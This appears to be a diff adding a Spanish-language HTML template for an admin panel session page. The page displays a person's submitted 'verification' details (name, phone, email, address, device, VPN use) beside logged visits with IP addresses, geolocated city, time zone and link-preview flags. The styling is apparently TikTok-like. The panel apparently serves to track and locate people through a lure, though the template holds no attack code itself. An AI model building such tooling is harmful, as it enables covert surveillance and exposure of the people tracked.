@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sesión {{ sid[:10] }}</title>
+<style>
+body{background:#0e0e12;color:#e4e4e7;font-family:system-ui;padding:20px;font-size:14px}
+h1{font-size:18px;margin-bottom:14px}h2{font-size:15px;margin:18px 0 8px;color:#a1a1aa}
+table{width:100%;border-collapse:collapse;background:#161823;border-radius:10px;overflow:hidden;margin-bottom:14px}
+th,td{padding:8px 10px;text-align:left;border-bottom:1px solid #232330;font-size:13px;word-break:break-all}
+th{background:#1c1c22;color:#a1a1aa}
+.box{background:#161823;border:1px solid #26262e;border-radius:10px;padding:14px;margin-bottom:14px}
+.box b{color:#25F4EE}
+textarea{width:100%;background:#0e0e12;color:#fff;border:1px solid #2c2c34;border-radius:8px;padding:10px}
+button{background:#FE2C55;color:#fff;border:0;padding:9px 16px;border-radius:8px;cursor:pointer;margin-top:8px}
+a{color:#25F4EE}
+</style></head><body>
+<h1>Sesión {{ sid }}</h1>
+<p><a href="/panel">← volver</a></p>
+
+{% if ver %}
+<h2>Formulario de verificación</h2>
+<div class="box">
+  <p><b>Nombre:</b> {{ ver.nombre }}</p>
+  <p><b>Teléfono:</b> {{ ver.telefono }}</p>
+  <p><b>Email:</b> {{ ver.email }}</p>
+  <p><b>Dirección declarada:</b> {{ ver.calle }} {{ ver.numero }} — {{ ver.referencia }}</p>
+  <p><b>Ciudad declarada:</b> {{ ver.ciudad }}, {{ ver.estado }}, {{ ver.pais }}</p>
+  <p><b>Dispositivo habitual:</b> {{ ver.dispositivo_habitual }} · <b>VPN:</b> {{ ver.usa_vpn }}</p>
+  <p><b>SHA-256:</b> {{ ver.sha256 }}</p>
+</div>
+{% endif %}
+
+<h2>Hits ({{ hits|length }})</h2>
+<table>
+<tr><th>Hora</th><th>Tipo</th><th>Paso</th><th>IP</th><th>Ciudad</th><th>Huso</th><th>Preview</th></tr>
+{% for h in hits %}
+<tr>
+  <td>{{ h.ts_utc.strftime("%d/%m %H:%M:%S") }}</td>
+  <td>{{ h.kind }}</td><td>{{ h.step }}</td><td>{{ h.ip }}</td>
+  <td>{{ h.city }}{% if h.country %}, {{ h.country }}{% endif %}</td>
+  <td>{{ h.tz }}</td>
+  <td>{% if h.preview_flag %}sí ({{ h.preview_reason }}){% endif %}</td>
+</tr>
+{% endfor %}
+</table>
+
+<h2>Notas</h2>
+{% for n in notas %}<div class="box">{{ n.text }}<br><small>{{ n.created_at }}</small></div>{% endfor %}
+<textarea id="nt" rows="3" placeholder="Añadir nota..."></textarea>
+<button onclick="addNota()">Guardar nota</button>
+
+<script>
+async function addNota(){
+  const t=document.getElementById("nt").value; if(!t)return;
+  await fetch("/panel/session/{{ sid }}/note",{method:"POST",
+    headers:{"Content-Type":"application/json"},body:JSON.stringify({text:t})});
+  location.reload();
+}
+</script>
+</body></html>
